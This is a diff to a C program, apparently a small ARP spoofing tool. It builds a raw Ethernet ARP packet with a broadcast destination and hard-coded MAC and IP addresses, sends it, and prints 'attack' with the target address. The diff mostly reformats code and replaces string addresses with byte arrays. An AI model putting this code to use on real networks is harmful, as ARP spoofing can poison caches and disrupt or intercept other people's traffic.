@@ -3,6 +3,7 @@
 #include <unistd.h>
 #include <errno.h>
 #include <stdio.h>
+#include <ctype.h>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
 #include <sys/types.h>
@@ -248,82 +249,64 @@ void mac_to_char(char *mac,unsigned char *str){
 // 填充MAC   
 void set_hw_addr (char buf[], char *str)
 {
-              int i;
-              char c, val;
-              for(i = 0; i < 6; i++)
-              {
-                      if (!(c = tolower(*str++)))
-                              perror("Invalid hardware address"),exit(1);
-                     if (isdigit(c))
-                             val = c - '0';
-                     else if (c >= 'a' && c <= 'f')
-                             val = c-'a'+10;
-                     else
-                             perror("Invalid hardware address"),exit(1);
-                     buf[i] = val << 4;
-                     if (!(c = tolower(*str++)))
-                             perror("Invalid hardware address"),exit(1);
-                     if (isdigit(c))
-                             val = c - '0';
-                     else if (c >= 'a' && c <= 'f')
-                             val = c-'a'+10;
-                     else
-                             perror("Invalid hardware address"),exit(1);
-                     buf[i] |= val;
-                     if (*str == ':')
-                             str++;
-             }
+	int i;
+	char c, val;
+	for(i = 0; i < 6; i++)
+	{
+		if (!(c = tolower(*str++)))
+			perror("Invalid hardware address"),exit(1);
+		if (isdigit(c))
+			val = c - '0';
+		else if (c >= 'a' && c <= 'f')
+			val = c-'a'+10;
+		else
+			perror("Invalid hardware address"),exit(1);
+		buf[i] = val << 4;
+		if (!(c = tolower(*str++)))
+			perror("Invalid hardware address"),exit(1);
+		if (isdigit(c))
+			val = c - '0';
+		else if (c >= 'a' && c <= 'f')
+			val = c-'a'+10;
+		else
+			perror("Invalid hardware address"),exit(1);
+		buf[i] |= val;
+		if (*str == ':')
+			str++;
+	}
 }
 /* 主函数 */
 int main(int argc,char *argv[])
 {
-	//printf("HelloWorld!\n");
+	unsigned char srcMacAddress[6] = {0x00,0x0C,0x29,0x46,0xB3,0x50};
 
-	/* create the ether header 1.0 */
-
-	char dstMacAddress[] = "a8:15:4d:1f:7d:68";
-
-	char srcMacAddress[] = "00:0C:29:46:B3:50";
-
-	/*
-	   MAC_FRAME_HEADER header;
-
-	   mac_to_char(dstMacAddress,header.m_cDstMacAddress);
-
-	   mac_to_char(srcMacAddress,header.m_cSrcMacAddress);
-
-	   header.m_cType = 0x0806;
-
-
-	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[0]);
-	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[1]);
-	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[2]);
-	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[3]);
-	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[4]);
-	   printf("header.m_cDstMacAddress = %2x\n",header.m_cDstMacAddress[5]);
-
-	   MAC_FRAME_TAIL tail;
-
-	   tail.m_sCheckSum = 0;
-
-	   printf("MAC_FRAME_TAIL m_sCheckSum = %u \n",tail.m_sCheckSum);
-
-	   if(argc > 1)
-	   {
-	   printf("i=%s \n",argv[1]);
-	   }
-	   */
-	/* Create the ether header 2.0 */
+	unsigned char dstMacAddress[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 
 	struct ether_header eth_hdr;
 
 	memset(&eth_hdr, 0,sizeof(struct ether_header));
-	
-	//针对以太网头部源地址进行赋值
-	mac_to_char(dstMacAddress,eth_hdr.ether_dhost);
 
-	//针对以太网头部目的地址进行赋值
-	mac_to_char(srcMacAddress,eth_hdr.ether_shost);
+	memcpy(eth_hdr.ether_dhost,dstMacAddress,6);
+
+	int i;
+
+	printf("destination ethernet address:");
+
+	for(i=0;i<6;i++){
+		printf("%02X:",eth_hdr.ether_dhost[i]);
+	}
+
+	printf("\n");
+
+	printf("source ethernet address:");
+	
+	memcpy(eth_hdr.ether_shost,srcMacAddress,6);
+
+	for(i=0;i<6;i++){
+		printf("%02X:",eth_hdr.ether_shost[i]);	
+	}
+
+	printf("\n");
 
 	eth_hdr.ether_type = htons(ETHERTYPE_ARP);
 
@@ -372,55 +355,58 @@ int main(int argc,char *argv[])
 
 	/* in address struct */
 
-	char *src_ip_addr = "192.168.0.1";
+	unsigned char sou_ip_addr[4] = {192,168,8,138};
 
-	char *trc_ip_addr = "192.168.188.1";
+	unsigned char des_ip_addr[4] = {192,168,8,138};
 
-	struct in_addr src_addr,trc_addr;
+	struct in_addr src_addr,des_addr;
 
 	memset(&src_addr, 0,sizeof(struct in_addr));
 
 	//inet_aton(src_ip_addr, &src_addr);	
 
-	if(inet_pton(AF_INET, src_ip_addr,(void *)&src_addr) < 0){
+	/*
+	if(inet_pton(AF_INET, sou_ip_addr,(void *)&src_addr) < 0){
 		perror("fail to convert\n");
 		exit(1);
 	}
-
-	memset(&trc_addr, 0,sizeof(struct in_addr));
+	*/
+	memset(&des_addr, 0,sizeof(struct in_addr));
 
 	//inet_aton(trc_ip_addr, &trc_addr);
-
-	if(inet_pton(AF_INET, trc_ip_addr,(void *)&trc_addr) < 0){
+	/*
+	if(inet_pton(AF_INET, des_ip_addr,(void *)&trc_addr) < 0){
 		perror("fail to convert\n");
 		exit(1);
-	}                                                         
+	}
+	*/
 	/* set arp packet data */  	
-	memcpy((void *) arp.arp_sha,(void *) eth_hdr.ether_shost, 6);
+	memcpy((void *) arp.arp_sha,(void *) eth_hdr.ether_dhost, 6);
 
-	memcpy((void *) arp.arp_spa,(void *) &src_addr, 4);
+	memcpy((void *) arp.arp_spa,(void *) sou_ip_addr, 4);
 
-	memcpy((void *) arp.arp_tha,(void *) eth_hdr.ether_dhost, 6);
+	memcpy((void *) arp.arp_tha,(void *) eth_hdr.ether_shost, 6);
 
-	memcpy((void *) arp.arp_tpa,(void *) &trc_addr, 4);
+	memcpy((void *) arp.arp_tpa,(void *) des_ip_addr, 4);
 
 	memcpy(buf, &eth_hdr, hdr_len);
 
 	memcpy(&buf[hdr_len], &arp, sizeof(struct ether_arp));
 	//printf("sizeof buf :%d\n",(int)sizeof(buf));
 	/*
-	   FILE *logfile;
 
-	   logfile=fopen("log.txt","w");
+	FILE *logfile;
 
-	   fprintf(logfile , "sdfsdf"); 
+	logfile=fopen("log.txt","w");
 
-	   fclose(logfile);	
-	   */
+	fprintf(logfile , "write log file"); 
+
+	fclose(logfile);	
+	*/
 
 	result = sendto(fd, buf, sizeof(buf), 0, &sa, sizeof(sa));
 
-	printf("attack %s\n!!\n", trc_ip_addr);
+	printf("attack %s\n!!\n", (char *)des_ip_addr);
 
 	printf("Sendto func result: %d \n",result);
 
